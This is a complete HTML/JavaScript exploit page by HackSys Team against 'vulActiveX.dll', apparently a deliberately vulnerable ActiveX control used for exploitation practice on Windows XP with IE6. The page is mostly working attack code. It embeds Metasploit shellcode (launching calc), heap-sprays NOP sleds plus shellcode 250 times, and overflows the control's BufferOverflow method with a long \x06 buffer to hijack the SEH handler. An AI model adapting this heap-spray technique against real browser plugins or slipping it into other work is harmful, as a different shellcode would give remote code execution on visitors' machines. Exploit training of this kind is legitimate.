<html>
<head>
    <title>vulActiveX.dll Heap Spray SEH Exploit</title>
    <object classid='clsid:C44CBF61-7844-4C4B-BC77-7643FD70848E' id='_vulActiveX'>
    </object>
    <script type="text/javascript" language="javascript">
        //==========================================//
        //		 vulActiveX Heap Spraying SEH		//
        //											//
        //		   HackSys Team - Panthera			//
        //       http://hacksys.vfreaks.com/		//
        //         hacksysteam@hotmail.com			//
        //											//
        //			Author: Ashfaq Ansari			//
        //		ashfaq_ansari1989@hotmail.com		//
        //											//
        //==========================================//

		//Heading
		heading = ("<h4><pre><b><strong><big>" +
		"#######################################################\n" +
		"vulActiveX.dll ActiveX Buffer Overflow (Heap Spray SEH)\n" +
		"#######################################################\n" +
		"\t\tHackSys Team - Panthera\n" +
		"\t\t Author: Ashfaq Ansari\n" +
		"\t     http://hacksys.vfreaks.com\n" +
		"\t      hacksysteam@hotmail.com\n" +
		"#######################################################\n" +
		"\t     Tested on WinXPSP3 with IE6\n" +
		"#######################################################\n" +
		"</b></strong></big></pre></h4>");

		document.write(heading);
        //root@bt: ~#msfpayload windows/exec CMD=calc J
        // windows/exec - 196 bytes
        // http://www.metasploit.com
        // VERBOSE=false, EXITFUNC=process, CMD=calc
        shellcode = unescape("%ue8fc%u0089%u0000%u8960%u31e5%u64d2%u528b%u8b30%u0c52" +
                             "%u528b%u8b14%u2872%ub70f%u264a%uff31%uc031%u3cac%u7c61" +
                             "%u2c02%uc120%u0dcf%uc701%uf0e2%u5752%u528b%u8b10%u3c42" +
                             "%ud001%u408b%u8578%u74c0%u014a%u50d0%u488b%u8b18%u2058" +
                             "%ud301%u3ce3%u8b49%u8b34%ud601%uff31%uc031%uc1ac%u0dcf" +
                             "%uc701%ue038%uf475%u7d03%u3bf8%u247d%ue275%u8b58%u2458" +
                             "%ud301%u8b66%u4b0c%u588b%u011c%u8bd3%u8b04%ud001%u4489" +
                             "%u2424%u5b5b%u5961%u515a%ue0ff%u5f58%u8b5a%ueb12%u5d86" +
                             "%u016a%u858d%u00b9%u0000%u6850%u8b31%u876f%ud5ff%uf0bb" +
                             "%ua2b5%u6856%u95a6%u9dbd%ud5ff%u063c%u0a7c%ufb80%u75e0" +
                             "%ubb05%u1347%u6f72%u006a%uff53%u63d5%u6c61%u0063");
        nops = unescape('%u9090%u9090');
        headersize = 20;

        //write the output to Internet Explorer's window
        document.write("<h2>vulActiveX.dll Heap Spray Attack</h2>");

        //create one block with nops
        document.write("Creating one block of memory with <b>NOPS</b>.</br>");
        slackspace = headersize + shellcode.length;
        while (nops.length < slackspace) nops += nops;
        fillblock = nops.substring(0, slackspace);

        //enlarge block with nops, size 0x50000
        document.write("Enlarging the memory with <b>NOPS</b> of size <b>0x5000</b>.</br>");
        block = nops.substring(0, nops.length - slackspace);
        while (block.length + slackspace < 0x50000) block = block + block + fillblock;

        document.write("Spraying <b>NOPS + SHELLCODE</b> <b>250</b> times.</br>");

        //spray 250 times : nops + shellcode
        memory = new Array();
        for (counter = 0; counter < 250; counter++) {
            memory[counter] = block + shellcode;

            //show the status of spray on Status bar
            window.status = "Spraying: " + Math.round(100 * counter / 250) + "% done";
        }

        document.write("Allocated <b>" + (block.length + shellcode.length).toString() + "</b> bytes.<br>");
        document.write("Heap Spraying completed successfully.<br>");
        window.status = "Launching Exploit";
        alert("Heap Spraying Done\n\n Launching Exploit");
		
		//overwrite the complete stack with "\x06\x06\x06\x06"
		//
		//			+------------------+
		//			| \x06\x06\x06\x06 |
		//			+------------------+
		//			| \x06\x06\x06\x06 | --------------------
		//			+------------------+				    |
		//			| \x06\x06\x06\x06 |		            V
		//			+------------------+			+-----------------+
		//			| \x06\x06\x06\x06 |			| NOP + SHELLCODE |
		//			+------------------+			+-----------------+
		//			| \x06\x06\x06\x06 |			| NOP + SHELLCODE |
		//			+------------------+			+-----------------+
		//			| \x06\x06\x06\x06 |			| NOP + SHELLCODE |
		//			+------------------+			+-----------------+
		//
        evil_payload = "";
        while (evil_payload.length < 14356) evil_payload += "\x06";

        //pass the parameter to BufferOverflow method
        _vulActiveX.BufferOverflow(evil_payload);
    </script>
</head>
<body>
</body>
</html>
